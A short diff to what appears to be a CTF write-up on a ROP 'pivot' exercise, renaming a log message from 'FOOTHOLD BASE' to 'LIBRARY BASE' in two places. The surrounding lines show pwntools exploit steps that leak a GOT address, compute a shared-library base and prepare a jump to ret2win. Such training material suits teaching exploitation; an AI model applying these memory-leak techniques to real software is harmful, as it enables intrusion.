@@ -234,7 +234,7 @@ info('LEAKED FOOTHOLD GOT: %s' % hex(leaked_foothold_got))
 
 # library base =    foothold_address - 0x096a
 libelf.address = leaked_foothold_got - libelf.sym['foothold_function']
-info('FOUND FOOTHOLD BASE @ %s' % hex(libelf.address))
+info('FOUND LIBRARY BASE @ %s' % hex(libelf.address))
 ```
 
 The disassembly of `foothold_function` for reference, placed at offset 0x096a:
@@ -338,7 +338,7 @@ leaked_foothold_got = leaked_foothold_got.replace(b'\n', b'')
 leaked_foothold_got = u64(leaked_foothold_got.ljust(8, b'\x00'))
 info('LEAKED FOOTHOLD GOT: %s' % hex(leaked_foothold_got))
 libelf.address = leaked_foothold_got - libelf.sym['foothold_function']
-info('FOUND FOOTHOLD BASE @ %s' % hex(libelf.address))
+info('FOUND LIBRARY BASE @ %s' % hex(libelf.address))
 
 # At this point we have restarted the app from main.
 # This run we use the calculated addresses to call ret2win directly from pwnme.
